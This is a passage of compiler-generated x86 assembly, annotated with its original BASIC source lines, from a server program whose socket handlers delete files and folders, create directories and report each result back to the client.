	or	eax,4			;;; i763
	mov	ebx,d[%3C%pFileOp.server]			;;; i663a
	mov	w[ebx+16],ax			;;; i13b
;
; [2031] pFileOp.lpszProgressTitle = 0
	mov	eax,d[%3C%pFileOp.server]			;;; i663a
	mov	ebx,0			;;; i659
	mov	d[eax+28],ebx			;;; i13b
;
; [2033] IFZ SHFileOperationA (&pFileOp) THEN
;
; [0] EXTERNAL FUNCTION SHFileOperationA (addrFileOp)
	mov	eax,d[%3C%pFileOp.server]			;;; i642
	push	eax			;;; i667a
	call	_SHFileOperationA@4			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.00C7.server			;;; i195
;
; [2034] SendMsg (socket,"CMSG --- files deleted from: "+dir)
	mov	eax,addr @_string.042E.server			;;; i663
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2035] ELSE
	jmp	end.if.00C7.server			;;; i107
else.00C7.server:
;
; [2036] SendMsg (socket,"CMSG --- cannot deleted files: "+dir+"\1\2--- "+GetLastErrorStr())
	mov	eax,addr @_string.042F.server			;;; i663
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03FB.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk3C.0000 = ebp-64	; internal variable
	mov	[ebp-64],eax			;;; i670
	call	func20.server			;;; i619
	mov	ebx,[ebp-64]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2037] END IF
end.if.00C7.server:
;
; [2038] SendMsg (socket,"DIR "+id+" "+name)
	mov	eax,addr @_string.0418.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-52]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2040] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientDelFiles.server:  ;;; Function end label for Assembly Programmers.
end.func3C.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3C.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func3C.server:
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientDelFiles ()  *****
;  *****
;
; [2042] FUNCTION ClientDelDir (socket,STRING msg)
.code
;
#ifdef ClientDelDir.socket
#undef ClientDelDir.socket
#endif
#define ClientDelDir.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientDelDir.msg
#undef ClientDelDir.msg
#endif
#define ClientDelDir.msg ebp+12	; exposes function argument 'msg'
;
align 16
_ClientDelDir.server@8:
;  *****
;  *****  FUNCTION  ClientDelDir ()  *****
;  *****
func3B.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3B.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.281:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.281			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody3B.server:
;
; [2043] '	STATIC SHFILEOPSTRUCT pFileOp
;
; [2044] STRING id,name,dir
#ifdef ClientDelDir.id
#undef ClientDelDir.id
#endif
#define ClientDelDir.id ebp-40	; exposes local variable 'id'
;
#ifdef ClientDelDir.name
#undef ClientDelDir.name
#endif
#define ClientDelDir.name ebp-44	; exposes local variable 'name'
;
#ifdef ClientDelDir.dir
#undef ClientDelDir.dir
#endif
#define ClientDelDir.dir ebp-48	; exposes local variable 'dir'
;
;
; [2047] id = GetTokenEx (@msg,32,0)' hItem
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2048] dir = GetTokenEx (@msg,'|',0)'
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2049] name = GetTokenEx (@msg,'|',0)' file to delete
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2050] IFZ name THEN RETURN
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.278			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00C8.server			;;; i192
A.278:
	xor	eax,eax			;;; i862
	jmp	end.func3B.server			;;; i258
else.00C8.server:
end.if.00C8.server:
;
; [2052] IF RemoveDirectoryA (&dir) THEN
;
; [0] EXTERNAL FUNCTION RemoveDirectoryA (lpPathName)
	mov	eax,d[ebp-48]			;;; i642
	push	eax			;;; i667a
	call	_RemoveDirectoryA@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00C9.server			;;; i221
;
; [2053] SendMsg (socket,"CMSG --- folder deleted: "+dir)
	mov	eax,addr @_string.0435.server			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2054] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func3B.server			;;; i258
;
; [2055] ELSE
	jmp	end.if.00C9.server			;;; i107
else.00C9.server:
;
; [2056] SendMsg (socket,"CMSG --- cannot delete folder: "+dir+"\1\2--- "+GetLastErrorStr())
	mov	eax,addr @_string.0436.server			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03FB.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk3B.0000 = ebp-56	; internal variable
	mov	[ebp-56],eax			;;; i670
	call	func20.server			;;; i619
	mov	ebx,[ebp-56]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2057] SendMsg (socket,"DIR "+id+" "+name)
	mov	eax,addr @_string.0418.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2058] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func3B.server			;;; i258
;
; [2059] END IF
end.if.00C9.server:
;
; [2061] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientDelDir.server:  ;;; Function end label for Assembly Programmers.
end.func3B.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3B.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func3B.server:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientDelDir ()  *****
;  *****
;
; [2063] FUNCTION ClientDelFile (socket,STRING msg)
.code
;
#ifdef ClientDelFile.socket
#undef ClientDelFile.socket
#endif
#define ClientDelFile.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientDelFile.msg
#undef ClientDelFile.msg
#endif
#define ClientDelFile.msg ebp+12	; exposes function argument 'msg'
;
align 16
_ClientDelFile.server@8:
;  *****
;  *****  FUNCTION  ClientDelFile ()  *****
;  *****
func3A.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3A.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.285:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.285			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
funcBody3A.server:
;
; [2064] STRING id,name,dir,filename
#ifdef ClientDelFile.id
#undef ClientDelFile.id
#endif
#define ClientDelFile.id ebp-40	; exposes local variable 'id'
;
#ifdef ClientDelFile.name
#undef ClientDelFile.name
#endif
#define ClientDelFile.name ebp-44	; exposes local variable 'name'
;
#ifdef ClientDelFile.dir
#undef ClientDelFile.dir
#endif
#define ClientDelFile.dir ebp-48	; exposes local variable 'dir'
;
#ifdef ClientDelFile.filename
#undef ClientDelFile.filename
#endif
#define ClientDelFile.filename ebp-52	; exposes local variable 'filename'
;
;
; [2066] id = GetTokenEx (@msg,32,0)' hItem
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2067] dir = GetTokenEx (@msg,'|',0)'
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2068] name = GetTokenEx (@msg,'|',0)' file to delete
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2069] IFZ name THEN RETURN
	mov	eax,[ebp-44]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.282			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00CA.server			;;; i192
A.282:
	xor	eax,eax			;;; i862
	jmp	end.func3A.server			;;; i258
else.00CA.server:
end.if.00CA.server:
;
; [2070] filename = dir + name
	mov	eax,[ebp-48]			;;; i665
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2072] IF DeleteFileA (&filename) THEN
	mov	eax,d[ebp-52]			;;; i642
	push	eax			;;; i667a
	call	_DeleteFileA@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00CB.server			;;; i221
;
; [2073] SendMsg (socket,"CMSG --- file deleted: "+filename)
	mov	eax,addr @_string.043D.server			;;; i663
	mov	ebx,[ebp-52]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2074] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func3A.server			;;; i258
;
; [2075] ELSE
	jmp	end.if.00CB.server			;;; i107
else.00CB.server:
;
; [2076] SendMsg (socket,"CMSG --- cannot delete file: "+filename+"\1\2--- "+GetLastErrorStr())
	mov	eax,addr @_string.043E.server			;;; i663
	mov	ebx,[ebp-52]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03FB.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
; .xstk3A.0000 = ebp-60	; internal variable
	mov	[ebp-60],eax			;;; i670
	call	func20.server			;;; i619
	mov	ebx,[ebp-60]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2077] SendMsg (socket,"DIR "+id+" "+name)
	mov	eax,addr @_string.0418.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2078] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func3A.server			;;; i258
;
; [2079] END IF
end.if.00CB.server:
;
; [2080] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientDelFile.server:  ;;; Function end label for Assembly Programmers.
end.func3A.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3A.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func3A.server:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientDelFile ()  *****
;  *****
;
; [2082] FUNCTION ClientNewDir (socket,STRING msg)
.code
;
#ifdef ClientNewDir.socket
#undef ClientNewDir.socket
#endif
#define ClientNewDir.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientNewDir.msg
#undef ClientNewDir.msg
#endif
#define ClientNewDir.msg ebp+12	; exposes function argument 'msg'
;
align 16
_ClientNewDir.server@8:
;  *****
;  *****  FUNCTION  ClientNewDir ()  *****
;  *****
func39.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func39.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.291:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.291			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody39.server:
;
; [2083] STRING dir,name,id
#ifdef ClientNewDir.dir
#undef ClientNewDir.dir
#endif
#define ClientNewDir.dir ebp-40	; exposes local variable 'dir'
;
#ifdef ClientNewDir.name
#undef ClientNewDir.name
#endif
#define ClientNewDir.name ebp-44	; exposes local variable 'name'
;
#ifdef ClientNewDir.id
#undef ClientNewDir.id
#endif
#define ClientNewDir.id ebp-48	; exposes local variable 'id'
;
;
; [2085] id = GetTokenEx (@msg,32,0)' if success return id + name
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2086] dir = GetTokenEx (@msg,'|',0)' create new dir here
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2087] name = GetTokenEx (@msg,'|',0)' name of new dir
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2089] IF (dir=="") || (name=="") THEN RETURN
	mov	eax,[ebp-40]			;;; i665
	xor	ebx,ebx			;;; i658
	call	%_string.compare.vv			;;; i690
;>peep
	mov	eax,0			;;; i466
	jne	> A.286			;;; i467
	not	eax			;;; i468
A.286:
;+peep
; .xstk39.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,[ebp-44]			;;; i665
	xor	ebx,ebx			;;; i658
	call	%_string.compare.vv			;;; i690
;>peep
	mov	eax,0			;;; i466
	jne	> A.287			;;; i467
	not	eax			;;; i468
A.287:
;+peep
	mov	ebx,d[ebp-56]			;;; i665
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.00CC.server			;;; i221
	xor	eax,eax			;;; i862
	jmp	end.func39.server			;;; i258
else.00CC.server:
end.if.00CC.server:
;
; [2090] IF RIGHT$(name,1) != "\\" THEN name = name + "\\"
	sub	esp,64			;;; i487
	mov	eax,[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02CD.server			;;; i663
	call	%_string.compare.sv			;;; i690
	je	>> else.00CD.server			;;; i219
	mov	eax,[ebp-44]			;;; i665
	mov	ebx,addr @_string.02CD.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.00CD.server:
end.if.00CD.server:
;
; [2091] dir = dir + name
	mov	eax,[ebp-40]			;;; i665
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2092] IF SIZE(dir) > 248 THEN' CreateDirectoryA() supports max of 248 chars
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.288			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.288:
	cmp	eax,248			;;; i684a
	jle	>> else.00CE.server			;;; i219
;
; [2093] SendMsg (socket,"CMSG --- directory too long (max 248): "+dir)
	mov	eax,addr @_string.0445.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2094] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func39.server			;;; i258
;
; [2095] END IF
else.00CE.server:
end.if.00CE.server:
;
; [2097] IFZ CreateDirectoryA (&dir,0) THEN
;
; [0] EXTERNAL FUNCTION CreateDirectoryA (lpPathName, lpSecurityAttributes)
	mov	eax,d[ebp-40]			;;; i642
	mov	d[ebp-56],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_CreateDirectoryA@8			;;; i619
	test	eax,eax			;;; i194
	jnz	>> else.00CF.server			;;; i195
;
; [2098] SendMsg (socket,"CMSG --- cannot create directory: "+dir+"\1\2--- "+GetLastErrorStr())
	mov	eax,addr @_string.0446.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03FB.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-56],eax			;;; i670
	call	func20.server			;;; i619
	mov	ebx,[ebp-56]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2099] ELSE
	jmp	end.if.00CF.server			;;; i107
else.00CF.server:
;
; [2100] SendMsg (socket,"DIR "+id+" "+name)
	mov	eax,addr @_string.0418.server			;;; i663
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2101] END IF
end.if.00CF.server:
;
; [2103] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientNewDir.server:  ;;; Function end label for Assembly Programmers.
end.func39.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func39.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func39.server:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientNewDir ()  *****
;  *****
;
; [2105] FUNCTION ClientTree (socket,STRING msg,STRING dir)
.code
;
#ifdef ClientTree.socket
#undef ClientTree.socket
#endif
#define ClientTree.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientTree.msg
#undef ClientTree.msg
#endif
#define ClientTree.msg ebp+12	; exposes function argument 'msg'
;
;
#ifdef ClientTree.dir
#undef ClientTree.dir
#endif
#define ClientTree.dir ebp+16	; exposes function argument 'dir'
;
align 16
_ClientTree.server@12:
;  *****
;  *****  FUNCTION  ClientTree ()  *****
;  *****
func38.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func38.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.294:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.294			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
